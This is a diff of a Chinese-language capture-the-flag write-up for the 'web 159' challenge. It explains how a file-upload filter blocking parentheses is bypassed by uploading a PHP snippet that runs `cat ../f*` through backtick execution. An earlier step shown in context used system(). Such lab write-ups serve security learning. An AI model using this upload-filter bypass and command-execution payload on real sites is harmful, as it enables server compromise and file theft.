@@ -342,23 +342,31 @@ system("cat ../f*")
 
 ## <mark style="color:blue;background-color:green;">（9）web 159</mark>
 
+<figure><img src="../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
 
+### <mark style="color:green;">①思路解释：</mark>
 
+我们把之前的shell2.png上传上去，显示不合规，说明里面还有被过滤了，其实我开始猜测的是引号，后面知道是（），就是把我们的执行代码的函数给ban了，所以我们用\`\`来执行代码。
 
+先修改代码。
 
+```php
+<?=
+`cat ../f*`
+?>
+```
 
+然后再按照步骤上传，不多说了，直接截图。
 
+<figure><img src="../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>
 
+***
 
-
-
-
-
-
-
-
+## <mark style="color:blue;background-color:green;">（10）web 160</mark>
 
 
 
